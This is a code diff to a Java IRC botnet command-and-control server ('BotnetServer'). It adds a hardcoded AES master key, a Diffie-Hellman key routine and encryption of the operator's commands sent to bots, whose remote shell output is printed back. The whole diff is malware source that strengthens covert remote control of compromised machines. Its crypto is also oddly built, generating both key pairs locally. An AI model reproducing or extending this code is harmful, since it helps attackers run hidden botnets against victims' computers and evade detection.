@@ -1,6 +1,15 @@
 import java.io.*;
 import java.net.*;
+import java.security.AlgorithmParameterGenerator;
+import java.security.AlgorithmParameters;
+import java.security.Key;
+import java.security.KeyPair;
+import java.security.KeyPairGenerator;
 import java.util.*;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.DHParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
 import javax.mail.*;
 import org.jibble.pircbot.*;
 
@@ -57,6 +66,20 @@ public class BotnetServer extends PircBot {
 	private Scanner input;
 	private boolean inChat;
 	
+	private static final byte[] key = 
+	{(byte)0x2e, (byte)0xa0, (byte)0x8c, (byte)0x66, (byte)0xf6, (byte)0x8d, (byte)0x71, 
+	(byte)0xae, (byte)0x83, (byte)0xa1, (byte)0x24, (byte)0x96, (byte)0xa3, (byte)0xc3, 
+	(byte)0xd0, (byte)0x91, (byte)0x7f, (byte)0x86, (byte)0x69, (byte)0x78, (byte)0x99, 
+	(byte)0xee, (byte)0x80, (byte)032, (byte)0x9d, (byte)0xb8, (byte)0xb1, (byte)0x47, 
+	(byte)0x65, (byte)0xa1, (byte)0xd0, (byte)0x01};
+
+	private Key masterKey;
+	private Cipher masterCipher;
+	
+	private MsgEncrypt masterMsgE;
+	
+	private Map<String, Key> botInfo;
+	
 	public static void main(String[] args) {
 		BotnetServer bn = new BotnetServer();
 	}
@@ -74,11 +97,41 @@ public class BotnetServer extends PircBot {
 			connect(SERVER, PORT);
 			
 			input = new Scanner(System.in);
+			
+			botInfo = new HashMap<String, Key>();
+			masterKey = new SecretKeySpec(key, "AES");
+			masterCipher = Cipher.getInstance("AES");
+			masterCipher.init(Cipher.ENCRYPT_MODE, masterKey);
+			masterMsgE = MsgEncrypt.getInstance(masterKey);
 		} catch (NickAlreadyInUseException e) {
 			changeNick(NAME);
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
+	}
+	
+	protected Key genCCBotKey() throws Exception {
+		AlgorithmParameterGenerator paramGen = AlgorithmParameterGenerator.getInstance("DH");
+		paramGen.init(1024);
+		AlgorithmParameters params = paramGen.generateParameters();
+
+		DHParameterSpec dhSpec = (DHParameterSpec)params.getParameterSpec(DHParameterSpec.class);
+
+		KeyPairGenerator keyGen = KeyPairGenerator.getInstance("DH");
+		
+		keyGen.initialize(dhSpec);
+		
+		KeyPair aKeyPair = keyGen.generateKeyPair();
+		KeyPair bKeyPair = keyGen.generateKeyPair();
+		
+		// This give the public keys...
+		Key aPubKey = aKeyPair.getPublic();
+		Key bPubKey = bKeyPair.getPublic();
+		
+		MsgEncrypt msgE = MsgEncrypt.getInstance(aKeyPair, bPubKey);
+		MsgEncrypt m2 = MsgEncrypt.getInstance(bKeyPair, aPubKey);
+		Key privKey = msgE.getPrivateKey();
+		return privKey;
 	}
 	
 	protected void onConnect() {
@@ -293,7 +346,7 @@ public class BotnetServer extends PircBot {
 				
 				String command = input.nextLine();
 				while (!command.equalsIgnoreCase(TERMINATION)) {
-					chat.sendLine(command);
+					chat.sendLine(masterMsgE.encryptMsg(command)); // Made this encrypted
 					String response = shellout.nextLine();
 					while (!response.endsWith(SENTINEL)) {
 						System.out.println("\t" + response);
